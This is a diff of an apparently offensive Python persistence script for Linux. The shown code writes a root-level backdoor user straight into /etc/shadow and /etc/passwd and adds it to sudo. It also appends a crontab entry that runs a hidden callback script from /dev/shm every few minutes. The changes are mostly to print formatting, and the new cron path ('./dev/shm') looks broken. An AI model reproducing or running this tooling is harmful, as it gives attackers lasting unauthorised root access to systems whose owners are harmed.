@@ -65,14 +65,14 @@ is_root = perm_check()
 # add user with root perms
 def add_user(username,password):
 	if username:
-		print("establishing persistence...")
+		print("\n### establishing persistence... ###")
 		os.system("mkpasswd {} > /tmp/.backups/pass.txt".format(password))
 		pass_file = open("/tmp/.backups/pass.txt", "r")
 		new_user_pass = pass_file.readlines()[-1].strip()
 		os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
 		os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
 		os.system("usermod -aG sudo {}".format(username))
-		print("user {} created and added to sudo group".format(username))
+		print("\n### user {} created and added to sudo group ###".format(username))
 		pass_file.close()
 	else:
 		print("\n*** error: username not specified: use -u to specify username ***")
@@ -93,8 +93,8 @@ def callback(local_ip, local_port, username, password):
 
 # create cronjob for executing callback script every 5 min
 def cron_make():
-	print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data-log.sh'---")
-	os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")
+	print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data_log'---")
+	os.system("echo '5 * * * * /bin/bash ./dev/shm/.data/data_log' >> /etc/crontab")
 	print("\n### cronjob created ###")
 
 
